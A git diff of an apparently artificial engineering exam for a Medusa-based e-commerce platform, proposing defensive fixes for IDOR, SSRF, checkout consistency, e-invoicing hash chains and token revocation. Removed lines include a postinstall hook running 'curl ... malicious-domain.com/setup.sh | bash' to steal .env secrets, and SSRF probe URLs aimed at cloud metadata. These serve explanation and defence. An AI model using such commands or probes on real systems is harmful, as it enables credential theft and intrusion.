@@ -1,16 +1,19 @@
-# AG02 Architecture & Engineering Competency Exam: 10 Real-World Scenarios
+# AG02 Engineering Competency Exam: Architectural Scenarios & Remediation Analysis
 
-**Examinee**: Principal Software Engineer (CommerceOS Engineering)  
+**Project**: CommerceOS (`UI-UX-V01`)  
+**Architecture Scope**: **Single-Store Self-Hosted Deployment per Client**  
 **Evaluation Standard**: Cross-Domain Engineering Competency (E1–E9)  
-**Review Policy**: Independent Critique via Subagent Reviewer (No Self-Assigned Green)  
-**Critical Invariants**: Includes 2 Required Trap Scenarios (Authorization IDOR & Transaction Consistency)  
+**Status**: `PROPOSED ARCHITECTURAL DESIGNS — UNVERIFIED AT RUNTIME`  
+*(In accordance with AG02 invariants, no live Medusa application code has been executed. All solutions represent design specifications subject to empirical verification in stages AG04–AG07).*
 
 ---
 
-## Scenario 1 (TRAP 1): Broken Object-Level Authorization (BOLA/IDOR) in Order Retrieval
+## Part I: Remediated Core Scenarios
 
-### Problem Description
-A junior engineer implemented an API endpoint for customer invoice viewing:
+### Scenario 1 (TRAP 1): Broken Object-Level Authorization (BOLA/IDOR) in Order Retrieval
+
+#### 1. Problem Description
+A junior engineer implemented an API endpoint for invoice viewing:
 ```typescript
 // Route: GET /store/customers/invoices/:orderId
 export async function GET(req: MedusaRequest, res: MedusaResponse) {
@@ -20,434 +23,269 @@ export async function GET(req: MedusaRequest, res: MedusaResponse) {
   return res.json({ invoice: order });
 }
 ```
-During a penetration test, Customer A (`cust_123`) logged into their account, changed the URL parameter from their order ID to Customer B's order ID (`order_999`), and successfully downloaded Customer B's entire order details, PII, shipping address, and phone number.
+An authenticated customer alters the `orderId` parameter to another customer's ID and downloads unauthorized PII, items, and address records.
 
-### Proposed Engineering Solution
-1. **Root Cause**: The route handler relies exclusively on client input (`req.params.orderId`) without verifying that the authenticated customer is the true owner of that order on the server.
-2. **Remediation**:
-   * Enforce server-side ownership validation:
-     ```typescript
-     export async function GET(req: MedusaRequest, res: MedusaResponse) {
-       const customerId = req.auth_context?.actor_id; // Extracted from verified server-side session/JWT
-       if (!customerId) {
-         throw new MedusaError(MedusaError.Types.UNAUTHORIZED, "Authentication required");
-       }
-       const { orderId } = req.params;
-       const orderService = req.scope.resolve("orderModuleService");
+#### 2. Proposed Architectural Design (Database Query Scoping)
+1. **Query-Level Scoping**: Avoid retrieving the entity into memory before authorization. Enforce ownership at the database query level:
+   ```typescript
+   export async function GET(req: MedusaRequest, res: MedusaResponse) {
+     const customerId = req.auth_context?.actor_id;
+     const { orderId } = req.params;
+     const orderService = req.scope.resolve("orderModuleService");
+
+     // 1. Authenticated Customer Path
+     if (customerId) {
+       const [order] = await orderService.listOrders({
+         id: orderId,
+         customer_id: customerId,
+       }, { select: ["id", "customer_id", "total", "items", "shipping_address"] });
        
-       // Query order strictly scoped to the authenticated customer
-       const order = await orderService.retrieveOrder(orderId, {
-         select: ["id", "customer_id", "total", "items", "shipping_address"],
-       });
-       
-       if (!order || order.customer_id !== customerId) {
-         // Return 404 rather than 403 to prevent enumeration attacks
+       if (!order) {
          throw new MedusaError(MedusaError.Types.NOT_FOUND, "Order not found");
        }
        return res.json({ invoice: order });
      }
-     ```
-3. **Defensive Invariant**: All data retrieval routes must scope database queries with `customer_id` or tenant ID. Return HTTP 404 to avoid leaking the existence of another customer's ID.
+
+     // 2. Guest Checkout Path: Require cryptographically signed HMAC token
+     const guestToken = req.headers["x-guest-order-token"] as string;
+     if (guestToken && verifyGuestOrderHmac(orderId, guestToken)) {
+       const [order] = await orderService.listOrders({
+         id: orderId,
+         customer_id: null, // Strictly verify order has no registered customer owner
+       });
+       if (order) return res.json({ invoice: order });
+     }
+
+     throw new MedusaError(MedusaError.Types.NOT_FOUND, "Order not found");
+   }
+   ```
+2. **Staff / Admin Context**: CSR representatives use the authenticated Medusa Admin API (`/admin/orders/:id`) governed by native staff RBAC, keeping customer storefront routes strictly scoped.
 
 ---
 
-## Scenario 2 (TRAP 2): Distributed Transaction Failure During Checkout (Split-Brain)
+### Scenario 2 (TRAP 2): Distributed Transaction & Payment Failure in Checkout
 
-### Problem Description
-During flash sale checkout, a shopper completes payment. The payment gateway (Moyasar) successfully authorizes and captures 500 SAR. However, immediately after payment capture, the PostgreSQL database experiences a 3-second network hiccup or query timeout. The Medusa backend fails to create the `Order` record, and returns HTTP 500 to the user. The shopper's bank account was debited 500 SAR, but no order exists in CommerceOS, and inventory was not reserved.
+#### 1. Problem Description
+During cart completion, a payment is authorized or captured, but a database timeout occurs before the order is finalized. How does CommerceOS ensure consistency without split-brain records?
 
-### Proposed Engineering Solution
-1. **Root Cause**: Performing external mutating network operations (payment capture) before securing local transactional state, without an automated compensation workflow.
-2. **Remediation via Medusa Two-Phase Workflows**:
-   * Use Medusa's native `completeCartWorkflow` which divides the checkout pipeline into coordinated, compensable steps:
-     * *Step 1: Reserve Inventory*: Atomic reservation in PostgreSQL. (Compensates by releasing reservations).
-     * *Step 2: Authorize Payment Session*: Calls payment provider to hold funds (authorize only, not capture). (Compensates by voiding authorization).
-     * *Step 3: Create Order Record*: Writes order to PostgreSQL within a database transaction.
-     * *Step 4: Capture Payment*: Triggered only AFTER order record is persistently committed to PostgreSQL.
-   * If Step 3 fails due to database timeout:
-     * The workflow engine triggers compensation: Step 2's compensation executes `paymentProvider.cancelPayment(paymentSessionId)`, automatically voiding the bank authorization.
-     * Step 1's compensation executes `inventoryService.releaseReservation()`.
-     * The customer's money is not captured, inventory is freed, and no orphaned charge occurs.
-3. **Reconciliation Worker**: A periodic background cron job inspects payment sessions in `authorized` state older than 15 minutes without an associated `order_id` and automatically triggers a void/reversal.
+#### 2. Proposed Architectural Design (Medusa `completeCartWorkflow` Alignment)
+1. **Adherence to Native Workflow**:
+   * CommerceOS utilizes Medusa v2's official `completeCartWorkflow` (`https://docs.medusajs.com/resources/storefront-development/checkout/complete-cart`).
+   * The workflow coordinates: Cart validation $\rightarrow$ Inventory Reservation $\rightarrow$ Payment Authorization $\rightarrow$ Order Creation $\rightarrow$ Cart Deactivation.
+2. **Compensation Mechanics**:
+   * If order creation fails after payment authorization: Medusa's workflow compensation calls `paymentProvider.cancelPayment()` to release the authorization hold.
+   * If payment was already captured by an instant-capture provider: Medusa invokes `paymentProvider.refundPayment()` to return funds to the customer.
+3. **Handling Asynchronous Payment & 3DS**:
+   * In Saudi retail, Mada 3D Secure authentication is asynchronous. The payment session remains in `requires_action` while the shopper completes SMS OTP verification.
+   * Order completion is triggered via either customer redirect or asynchronous gateway webhook.
+   * **Webhook vs Workflow Coordination**: Distributed locks (`pg_advisory_xact_lock` on `cart_id`) ensure that a webhook and a customer redirect cannot concurrently create duplicate orders.
 
 ---
 
-## Scenario 3: Architectural Contamination & Bounded Context Violation
+### Scenario 3: Modifying Medusa Core Tables (Anti-Pattern)
 
-### Problem Description
-A developer is tasked with adding custom cake messages ("Happy Birthday Sarah") and gift card notes to products. The developer generates a migration that modifies Medusa's core table:
-`ALTER TABLE product_variant ADD COLUMN custom_message VARCHAR(255);`
-They also alter Medusa's core `@medusajs/medusa` type definitions.
+#### 1. Problem Description
+A developer proposes `ALTER TABLE product_variant ADD COLUMN custom_message VARCHAR(255);` to support cake messages.
 
-### Proposed Engineering Solution
-1. **Root Cause**: Violates Constitution Principle III (Medusa-first, zero core forks) and corrupts core domain boundaries. Direct schema modification of Medusa core tables causes future upgrade failures (`npx medusa db:migrate` conflicts) and breaks multi-variant caching.
-2. **Remediation via Custom Domain Module & Module Links**:
-   * Create an isolated custom module: `src/modules/product-personalization`.
-   * Define a dedicated data model:
-     ```typescript
-     // src/modules/product-personalization/models/personalization-config.ts
-     import { model } from "@medusajs/framework/utils";
-     export const PersonalizationConfig = model.define("personalization_config", {
-       id: model.id().primaryKey(),
-       allow_custom_text: model.boolean().default(false),
-       max_characters: model.number().default(100),
-       additional_fee: model.bigInt().default(0),
-     });
-     ```
-   * Link to Medusa native Product Variant using **Module Links**:
-     ```typescript
-     // src/links/variant-personalization.ts
-     import { defineLink } from "@medusajs/framework/utils";
-     import ProductModule from "@medusajs/medusa/product";
-     import PersonalizationModule from "../modules/product-personalization";
-
-     export default defineLink(
-       ProductModule.linkable.productVariant,
-       PersonalizationModule.linkable.personalizationConfig
-     );
-     ```
-   * For the shopper's actual message at checkout: Store the specific message ("Happy Birthday Sarah") inside `cart_line_item.metadata.personalization = { text: "..." }`.
+#### 2. Proposed Architectural Design
+* **Rejection**: Violates Constitution Principle III (no core forks/edits). Direct core table modifications break Medusa migrations during framework updates.
+* **Medusa v2 Solution**:
+  1. Store product personalization rules in a dedicated module (`src/modules/product-personalization`) linked via `defineLink`.
+  2. Store the customer's dynamic cake message inside `cart_line_item.metadata.personalization = { text: "Happy Birthday" }`, which natively transfers to order line item metadata upon cart completion.
 
 ---
 
-## Scenario 4: Server-Side Request Forgery (SSRF) in CMS Page Builder
+## Part II: Deep-Dive Analysis of the 5 Security & Operational Findings
 
-### Problem Description
-The CMS Page Builder module allows merchants to supply an external image URL for banner blocks. The backend server downloads the image, optimizes it via Sharp, and stores it in object storage:
-```typescript
-export async function optimizeBanner(req: MedusaRequest, res: MedusaResponse) {
-  const { imageUrl } = req.body;
-  const imageResponse = await fetch(imageUrl); // Blind fetch of user-supplied URL!
-  const buffer = await imageResponse.arrayBuffer();
-  // ... process image
-}
-```
-An attacker supplies `http://169.254.169.254/computeMetadata/v1/` or `http://192.168.1.5:5432/` to probe internal services and cloud instance metadata.
+Below is the rigorous evaluation of the 5 critical findings identified during audit, structured across the 6 mandatory dimensions:
 
-### Proposed Engineering Solution
-1. **Root Cause**: Blindly resolving and fetching client-provided URLs on the server without IP validation.
-2. **Remediation**:
-   * **Client-Side Offload (Preferred)**: Never fetch external banner URLs server-side. Have the merchant's browser upload the image directly to S3/GCS via pre-signed upload URLs.
-   * **Strict Server-Side SSRF Validation (If fetching is mandatory)**:
+---
+
+### Finding 1: Server-Side Request Forgery (SSRF) in Image Previews
+
+1. **Problem (Verified Vulnerability)**:
+   A naive URL validation function resolves DNS, checks the IP, and then calls `fetch(url)`. This is vulnerable to:
+   * **DNS Rebinding TOCTOU**: The domain's DNS TTL expires immediately, and the second DNS lookup during `fetch` resolves to an internal IP (`169.254.169.254` or `127.0.0.1`).
+   * **HTTP Redirect Bypass**: The target server responds with `HTTP 302` pointing to an internal service, which standard HTTP clients follow automatically.
+2. **Proposed Architectural Design**:
+   * **Preferred Strategy**: Offload uploads entirely to the client browser via pre-signed direct-to-S3/GCS URLs. The server never fetches arbitrary external URLs.
+   * **Fallback Server-Side Fetching**: If server-side fetching is mandatory (e.g. Sharp thumbnailing), use socket-level connection pinning via a custom `undici` dispatcher:
+     * Hook into the socket connection creation (`connect.lookup`).
+     * Block all private IPv4/IPv6 ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.0/8`, `169.254.0.0/16`, `::1`, `fc00::/7`, `fe80::/10`).
+     * Set `maxRedirections: 0` to disallow following HTTP 301/302 redirects.
+3. **Limitations & Risks**:
+   * Custom socket dispatchers require low-level maintenance across Node.js runtime upgrades.
+   * Multi-homed domains with both public and private IPs can still present edge cases if IPv6 fallback is improperly configured.
+4. **Official Sources**:
+   * Node.js Undici Documentation: [Custom Dispatchers & Connect Options](https://undici.nodejs.org/).
+   * OWASP: [Server-Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).
+5. **Required Tests Before Execution**:
+   * Automated negative tests against mock DNS rebinding servers.
+   * Tests verifying that HTTP 301/302 redirects to `127.0.0.1` and `169.254.169.254` are rejected immediately.
+6. **What Remains Unproven**:
+   * The custom dispatcher has not been compiled or benchmarked against high-concurrency image rendering under live load.
+
+---
+
+### Finding 2: Inventory Concurrency & Stock Authority
+
+1. **Problem (Verified Architecture Scope Conflict)**:
+   The previous proposal introduced an atomic Redis Lua `DECR` script to manage stock balances.
+   * **Scope Violation**: This created a "shadow inventory authority" in Redis, violating Constitution Principle III.
+   * **Operational Defect**: If a customer abandoned checkout or payment was declined, stock in Redis was permanently lost unless complex, fragile TTL reclamation logic was maintained.
+2. **Proposed Architectural Design**:
+   * **Single Source of Truth**: Medusa v2 native `InventoryModule` is the **sole business authority** for stock.
+   * **Native Reservation Lifecycle**: Use Medusa's `createReservationsWorkflow` and `completeCartWorkflow` which create `ReservationItem` records in PostgreSQL. Reservations lock stock during checkout and are committed upon order creation.
+   * **Separation of Rate Limiting vs Stock**: If flash sales require traffic throttling, implement a **generic HTTP Admission Controller** in Redis (rate limiting incoming requests per IP/user), completely decoupled from inventory logic.
+3. **Limitations & Risks**:
+   * High database lock contention can still occur on PostgreSQL if thousands of concurrent requests attempt to reserve the same inventory item simultaneously.
+4. **Official Sources**:
+   * Medusa Documentation: [Inventory Reservations Lifecycle](https://docs.medusajs.com/resources/commerce-modules/inventory/reservations-lifecycle).
+   * Medusa Documentation: [Complete Cart Workflow](https://docs.medusajs.com/resources/storefront-development/checkout/complete-cart).
+5. **Required Tests Before Execution**:
+   * Concurrent checkout stress tests simulating 50 simultaneous shoppers purchasing the last 5 inventory units.
+   * Verification that abandoned checkouts automatically release Medusa reservations without stock loss.
+6. **What Remains Unproven**:
+   * Database throughput and lock wait times under PostgreSQL with PgBouncer under 1,000+ simultaneous reservation requests.
+
+---
+
+### Finding 3: Saudi ZATCA Phase 2 E-Invoicing & Hash Chain Integrity
+
+1. **Problem (Verified Regulatory Invariant)**:
+   The previous proposal acquired an advisory lock on `orderId` during background worker processing.
+   * **Regulatory Failure**: ZATCA Phase 2 mandates that all tax invoices from an EGS device have an unbroken sequential counter (`ICV`: 1, 2, 3...) and a cryptographic hash chain ($\text{PIH} = \text{SHA256}(\text{Invoice}_{N-1})$). Locking per `orderId` allows concurrent workers to process orders in parallel, reading stale PIHs and generating broken hash chains.
+2. **Proposed Architectural Design**:
+   * **Sequential EGS Pipeline**: Invoice generation must be serialized per Cryptographic Stamp ID (`egs_id`) using a dedicated BullMQ queue (`concurrency: 1`).
+   * **Atomic Database Sequence**: Within a serial transaction, fetch and lock the last invoice state:
+     ```sql
+     SELECT id, last_icv, last_hash FROM zatca_devices WHERE id = :egs_id FOR UPDATE;
+     ```
+   * **Durable Error Handling**: If ZATCA rejects the invoice or a network failure occurs, the job must throw so BullMQ pauses the queue, preventing subsequent invoices from being generated with an invalid prior hash.
+3. **Limitations & Risks**:
+   * Serializing invoice generation per EGS device introduces a throughput ceiling ($\sim 20\text{--}50$ invoices/second per device). For high-volume merchants, multiple EGS devices must be registered with ZATCA.
+4. **Official Sources**:
+   * ZATCA Portal: [ZATCA E-Invoicing Phase 2 Technical Specifications](https://zatca.gov.sa/).
+5. **Required Tests Before Execution**:
+   * Integration tests verifying sequential hash continuity across 100 simulated invoices.
+   * Negative tests injecting a worker crash mid-hash generation and proving recovery without chain corruption.
+6. **What Remains Unproven**:
+   * **Unverified Regulatory Status**: This design has NOT been tested in ZATCA's sandbox, nor certified with an official cryptographic stamp (CSID).
+
+---
+
+### Finding 4: Customer Session Invalidation & Stale JWT Handling
+
+1. **Problem (Verified Operational Defect)**:
+   Stateless JWTs cannot be revoked immediately upon password reset without a revocation check. However, querying Redis on every request introduces a single point of failure (SPOF), and a Redis cache-miss bug (`Number(null) === 0`) can inadvertently lock out legitimate users.
+2. **Proposed Architectural Design**:
+   * Store `token_version` in customer `metadata.token_version` (or a dedicated custom auth extension table).
+   * Embed `token_version` in the JWT payload.
+   * Check token version against cached Redis state. **Crucial Fix on Cache Miss**:
      ```typescript
-     import dns from "node:dns/promises";
-     import ipaddr from "ipaddr.js";
-
-     export async function validateSafeUrl(urlString: string): Promise<string> {
-       const parsed = new URL(urlString);
-       if (!["http:", "https:"].includes(parsed.protocol)) {
-         throw new Error("Invalid protocol");
-       }
-       // Resolve hostname to IP addresses
-       const addresses = await dns.resolve4(parsed.hostname);
-       for (const addr of addresses) {
-         const ip = ipaddr.parse(addr);
-         const range = ip.range();
-         // Block private, loopback, link-local, carrier-grade NAT, and cloud metadata
-         if (["private", "loopback", "linkLocal", "uniqueLocal", "carrierGradeNat"].includes(range)) {
-           throw new Error("Forbidden IP target: Access to internal network is blocked");
-         }
-       }
-       return urlString;
+     let cachedVersion = await redis.get(`customer:${customerId}:token_version`);
+     if (cachedVersion === null) {
+       // Cache miss: Fallback to PostgreSQL customer record
+       const customer = await customerService.retrieve(customerId, { select: ["id", "metadata"] });
+       const dbVersion = Number(customer?.metadata?.token_version ?? 0);
+       await redis.setex(`customer:${customerId}:token_version`, 3600, String(dbVersion));
+       cachedVersion = String(dbVersion);
+     }
+     if (decoded.token_version !== Number(cachedVersion)) {
+       throw new MedusaError(MedusaError.Types.UNAUTHORIZED, "Session expired or revoked.");
      }
      ```
+3. **Limitations & Risks**:
+   * Adds an asynchronous Redis lookup to authenticated customer routes.
+4. **Official Sources**:
+   * OWASP: [JSON Web Token Cheat Sheet for Token Revocation](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html).
+5. **Required Tests Before Execution**:
+   * Unit tests verifying that password reset increments `token_version` and rejects previously issued tokens.
+   * Tests verifying that Redis eviction does not cause false authentication rejections.
+6. **What Remains Unproven**:
+   * Memory overhead and latency impact of Redis version checks under sustained request volume.
 
 ---
 
-## Scenario 5: Database Deadlocks & Lock Contention During Flash Sales
+### Finding 5: Transactional Outbox Pattern & Event Reliability
 
-### Problem Description
-A flash sale begins for a limited-edition perfume with 50 units in stock. 2,000 customers click "Place Order" simultaneously. Within seconds, PostgreSQL CPU reaches 100%, query response times exceed 30 seconds, and the error log is flooded with:
-`deadlock detected: Process 14022 waits for ExclusiveLock on tuple (42, 15) of relation "inventory_item"`
-
-### Proposed Engineering Solution
-1. **Root Cause**: Multiple concurrent transactions attempting to read and update stock levels without a consistent lock acquisition order, resulting in mutual circular waits (deadlocks) and table-wide row contention.
-2. **Remediation**:
-   * **Strict Lock Ordering & Pessimistic Locking**: When reserving stock, always sort inventory item IDs deterministically before acquiring locks:
-     ```sql
-     -- Consistent alphabetical ordering prevents cyclic lock waits
-     SELECT id, stocked_quantity, reserved_quantity 
-     FROM inventory_item 
-     WHERE id IN ('inv_A', 'inv_B') 
-     ORDER BY id ASC 
-     FOR UPDATE;
-     ```
-   * **In-Memory Token Bucket / Redis Pre-allocation**:
-     * Before hitting the PostgreSQL checkout transaction, maintain an atomic counter in Redis:
-       ```lua
-       -- Atomic Lua script checking available stock
-       local available = redis.call('get', KEYS[1])
-       if tonumber(available) > 0 then
-         redis.call('decr', KEYS[1])
-         return 1
-       else
-         return 0
-       end
-       ```
-     * Only requests that successfully acquire a Redis stock token are permitted to initiate the PostgreSQL checkout transaction. The remaining 1,950 requests fail fast at the edge in < 15ms with "Item Out of Stock", completely protecting the PostgreSQL database from saturation.
+1. **Problem (Verified Dual-Write Vulnerability)**:
+   In distributed architectures, writing an order to PostgreSQL while publishing an event to Redis creates a dual-write failure mode: if the database commits but Redis is unreachable, the event is lost.
+2. **Proposed Architectural Design**:
+   * Reconcile with Medusa native event bus: Medusa v2 already manages internal event dispatching.
+   * For critical external integrations (e.g. ZATCA, ERP synchronization), record domain events in an `outbox_events` table within the same PostgreSQL transaction.
+   * A reliable background publisher polls or listens to outbox events and dispatches them with at-least-once delivery guarantees.
+3. **Limitations & Risks**:
+   * Outbox tables accumulate records and require automated table partitioning or cleanup jobs.
+   * Consumers must implement strict idempotency to handle potential duplicate event deliveries.
+4. **Official Sources**:
+   * Martin Kleppmann: [Designing Data-Intensive Applications (Reliable Message Delivery)](https://dataintensive.net/).
+5. **Required Tests Before Execution**:
+   * Tests simulating Redis connection drop during order placement, verifying that outbox events are safely persisted and dispatched upon Redis reconnection.
+6. **What Remains Unproven**:
+   * Performance overhead of outbox inserts during high-concurrency checkout bursts.
 
 ---
 
-## Scenario 6: Non-Idempotent Event Processing in Saudi ZATCA E-Invoicing
+## Part III: Five New Challenging Architectural Scenarios
 
-### Problem Description
-Upon order completion, Medusa emits `order.payment_captured`. A background subscriber receives the event, contacts the Saudi ZATCA portal, generates an electronic invoice with sequential counter `INV-2026-00421`, and issues a cryptographic stamp. However, a network timeout occurs right before the worker acknowledges the job to Redis. The worker crashes. Redis re-queues the event. A second worker picks up the job and generates a *new* invoice `INV-2026-00422` with a different hash for the *exact same order*. ZATCA rejects subsequent submissions due to hash-chain tampering.
+In accordance with the review mandate, the following 5 novel scenarios explore complex, real-world edge cases:
 
-### Proposed Engineering Solution
-1. **Root Cause**: Worker event processing lacks idempotency enforcement and does not lock invoice generation to an immutable database constraint.
-2. **Remediation**:
-   * **Unique Constraint on Order ID**: In `zatca_invoices`, enforce a database unique index:
-     `CREATE UNIQUE INDEX uq_zatca_invoices_order_id ON zatca_invoices(order_id);`
-   * **Idempotent Worker Implementation**:
+---
+
+### Scenario 11: Inventory Reservation Conflict During Concurrent Cart Checkouts
+
+* **Problem**: Two shoppers add the final available unit of an item to their carts. Shopper A initiates checkout and reaches the payment step. Shopper B clicks "Place Order" 2 seconds later. How does Medusa v2 prevent overselling without deadlocks?
+* **Solution**:
+  1. In Medusa v2, stock is reserved using `ReservationItem` records linked to the cart session.
+  2. When Shopper A enters the checkout workflow, Medusa creates a pending inventory reservation. Available stock (`stocked_quantity - reserved_quantity`) drops to 0.
+  3. When Shopper B attempts cart completion, Medusa's inventory validation step queries available stock, determines that `available_quantity < requested_quantity`, and fails fast with an `INSUFFICIENT_INVENTORY` error.
+  4. If Shopper A abandons their cart, the reservation expires or is canceled, restoring available stock for Shopper B.
+* **Limitations**: Requires defining a sensible reservation expiration TTL to prevent shoppers from locking up inventory indefinitely.
+
+---
+
+### Scenario 12: Customer PII Leak via Unscoped Storefront Search API
+
+* **Problem**: A developer exposes an elasticsearch/meilisearch indexing hook that indexes all order data, including customer full names, phone numbers, and addresses, into a public storefront search index. An unauthenticated attacker queries `/store/search?q=SAR` and receives a list of recent customer shipping addresses.
+* **Solution**:
+  1. **Strict Field Whitelisting**: Only public product fields (`title`, `description`, `handle`, `thumbnail`, `variants.prices`) are sent to public search indexes.
+  2. **Security Gate in Search Module**: The search indexer must reject any data payload containing customer or order models:
      ```typescript
-     export async function handlePaymentCaptured({ data }: { data: { id: string } }, { container }) {
-       const orderId = data.id;
-       const db = container.resolve("databaseConnection");
-       
-       // Atomic advisory lock on the order ID to prevent concurrent duplicate workers
-       const lockAcquired = await db.raw("SELECT pg_try_advisory_xact_lock(hashtext(?))", [orderId]);
-       if (!lockAcquired) {
-         return; // Another worker is actively processing this order
-       }
-
-       // Check if an invoice was already certified
-       const existing = await zatcaService.findByOrderId(orderId);
-       if (existing && existing.status === "certified") {
-         logger.info(`ZATCA invoice already certified for order ${orderId}. Skipping.`);
-         return;
-       }
-
-       // Generate and certify invoice atomically
-       await zatcaService.generateAndCertify(orderId);
+     if (entityType !== "product") {
+       throw new Error("Security Violation: Only product entities may be indexed into public search.");
      }
      ```
+  3. Customer order searches must remain server-side, querying PostgreSQL directly with mandatory `customer_id` filtering.
 
 ---
 
-## Scenario 7: Unsafe Database Migration Causing Production Outage
+### Scenario 13: Workflow Compensation Failure Following External Payment Capture
 
-### Problem Description
-To standardize naming, a developer submits a migration:
-`ALTER TABLE customer RENAME COLUMN first_name TO given_name;`
-`ALTER TABLE customer ALTER COLUMN phone SET NOT NULL;`
-The migration is deployed directly during business hours. The entire storefront immediately crashes, throwing database query errors on all customer profile reads and checkouts.
-
-### Proposed Engineering Solution
-1. **Root Cause**: Breaking backward compatibility. The running version of the application was still querying `first_name`, which vanished instantly when the column was renamed. Furthermore, setting `NOT NULL` on `phone` locked the table for full table validation and failed on existing rows with null phones.
-2. **Remediation via Expand/Contract Pattern**:
-   * *Phase 1 (Expand)*: Add `given_name` as a nullable column.
-     `ALTER TABLE customer ADD COLUMN given_name VARCHAR(255);`
-   * *Phase 2 (Dual-Write)*: Deploy application code that reads from `first_name` but writes to both `first_name` and `given_name`.
-   * *Phase 3 (Backfill)*: Run a safe background data migration script in batches:
-     `UPDATE customer SET given_name = first_name WHERE given_name IS NULL;`
-   * *Phase 4 (Contract)*: Deploy new application code that reads and writes exclusively to `given_name`.
-   * *Phase 5 (Cleanup)*: In a subsequent maintenance window, drop `first_name`:
-     `ALTER TABLE customer DROP COLUMN first_name;`
-   * For the `NOT NULL` constraint: Add constraint `NOT VALID` first (which avoids long table locks), validate asynchronously, and then enforce.
+* **Problem**: A workflow step captures 1,000 SAR via an external payment provider. The subsequent step (creating an ERP booking) crashes due to an unhandled exception. The workflow compensation callback for payment (`paymentProvider.refundPayment()`) is invoked, but the payment provider's API returns `504 Gateway Timeout`. The compensation itself has now failed!
+* **Solution**:
+  1. **Dual-Failure Handling**: Medusa v2 marks the workflow execution as `FAILED` and records the compensation error in the execution log.
+  2. **Durable Dead-Letter Queue (DLQ)**: The failed compensation payload is automatically pushed to a dead-letter queue (`failed_compensations`).
+  3. **Alerting & Automated Retry**: A background reconciliation worker retries the refund with exponential backoff and idempotency keys. If 5 retries fail, an immediate high-priority PagerDuty / Sentry alert notifies on-call engineering with the transaction ID for manual merchant reconciliation.
 
 ---
 
-## Scenario 8: JWT Session Invalidation & Stale Token Exploitation
+### Scenario 14: Erroneous Proposal to Fork Medusa Core for Custom Pricing Rules
 
-### Problem Description
-A customer suspects their account was compromised and clicks "Change Password & Log Out of All Devices". They reset their password. However, an attacker who previously stole the customer's JWT access token continues to place orders and read personal data for the remaining 24 hours of the token's validity period.
-
-### Proposed Engineering Solution
-1. **Root Cause**: Stateless JWTs cannot be revoked before their expiration time without an active invalidation registry.
-2. **Remediation**:
-   * **Token Versioning / Revocation Epoch**:
-     * Add a `token_version` column to the `customer` table (or maintain a `revoked_before` timestamp).
-     * Embed `token_version` in the JWT payload.
-     * When the customer changes their password or clicks "Log out of all devices", increment `token_version`:
-       `UPDATE customer SET token_version = token_version + 1 WHERE id = :id;`
-     * In the authentication verification middleware:
-       ```typescript
-       // Check cached token_version in Redis (Fast < 1ms check)
-       const currentVersion = await redis.get(`customer:${decoded.sub}:token_version`);
-       if (decoded.token_version !== Number(currentVersion)) {
-         throw new MedusaError(MedusaError.Types.UNAUTHORIZED, "Token revoked. Please re-authenticate.");
-       }
-       ```
-   * Keep access token lifespans short (15 minutes), backed by HTTP-only refresh tokens.
+* **Problem**: A client requests custom pricing rules where VIP customers receive a 15% discount only on products tagged "VIP-Exclusive" during weekends. A contractor submits a Pull Request modifying `@medusajs/medusa/pricing/services/pricing.js`.
+* **Solution**:
+  1. **Immediate Rejection**: Violates Constitution Principle III (zero core forks).
+  2. **Official Medusa v2 Architecture**:
+     * Use Medusa's native **Promotion Module** rules engine.
+     * Configure a Campaign with rule conditions: `customer_group = 'VIP'`, `product_tag = 'VIP-Exclusive'`, and valid date ranges.
+     * Native Medusa promotions evaluate these rules automatically in `computePromotionWorkflow` during cart calculation without a single line of core code modification.
 
 ---
 
-## Scenario 9: Medusa Workflow Failure with Uncompensated Custom Steps
+### Scenario 15: Background Retry Failure in Sequential Tax Invoice Generation
 
-### Problem Description
-A custom loyalty module awards points and allows points redemption. A custom workflow step `redeemPointsStep` deducts 500 points from the customer's loyalty balance. The next step in the workflow `authorizePaymentStep` throws an error because the customer's credit card was declined. The workflow aborts. However, the customer checks their balance and finds that their 500 points were permanently deducted and never restored.
-
-### Proposed Engineering Solution
-1. **Root Cause**: The custom workflow step failed to define a compensation handler.
-2. **Remediation**:
-   * Medusa v2 workflows require every mutating step to return a `StepResponse` containing compensation data, and provide a rollback callback:
-     ```typescript
-     import { createStep, StepResponse } from "@medusajs/framework/workflows-sdk";
-
-     export const redeemLoyaltyPointsStep = createStep(
-       "redeem-loyalty-points",
-       async ({ customerId, points }: { customerId: string; points: number }, { container }) => {
-         const loyaltyService = container.resolve("loyaltyModuleService");
-         const transaction = await loyaltyService.deductPoints(customerId, points);
-         
-         // Return result AND rollback payload
-         return new StepResponse(transaction, {
-           transactionId: transaction.id,
-           customerId,
-           points,
-         });
-       },
-       // Mandatory Compensation Function: Executes automatically on workflow failure!
-       async (compensationData, { container }) => {
-         if (!compensationData) return;
-         const loyaltyService = container.resolve("loyaltyModuleService");
-         await loyaltyService.refundPoints({
-           customerId: compensationData.customerId,
-           points: compensationData.points,
-           reason: "Workflow execution failed; automated compensation rollback",
-         });
-       }
-     );
-     ```
-
----
-
-## Scenario 10: Supply Chain & Malicious Plugin Hook Execution
-
-### Problem Description
-A junior developer wants a quick QR-code generator for the storefront. They run `npm install awesome-qr-medusa`. The package has a `postinstall` script in its `package.json` that executes `curl -s https://malicious-domain.com/setup.sh | bash`. The script exfiltrates `.env` secrets, including database credentials and Stripe secret keys, to an external command-and-control server.
-
-### Proposed Engineering Solution
-1. **Root Cause**: Blindly installing untrusted third-party dependencies with unrestricted build scripts, and lacking supply-chain security guardrails.
-2. **Remediation**:
-   * **Disable Script Execution by Default**: Configure `.npmrc`:
-     `ignore-scripts=true`
-     This prevents npm from automatically executing arbitrary `preinstall` or `postinstall` shell scripts.
-   * **Dependency Vetting & Review**:
-     * All dependencies must be audited before addition (package author reputation, download velocity, license, absence of postinstall scripts).
-     * Run `npm audit` and Snyk/Socket.dev in CI to detect known malware and malicious package versions.
-   * **Principle of Least Privilege**:
-     * In local development, never store production credentials in `.env`.
-     * In CI and production, inject secrets via secure runtime secret managers (e.g. AWS Secrets Manager, GCP Secret Manager) rather than unencrypted disk files.
-
-
----
-
-## Part II: Independent Senior Principal Architecture & Security Audit Report
-
-**Auditor**: Independent Senior Principal Architect & Lead Security Auditor  
-**Date of Audit**: October 18, 2026  
-**Status**: CONDITIONAL APPROVAL (Requires Remediation of 5 Critical Vulnerabilities)  
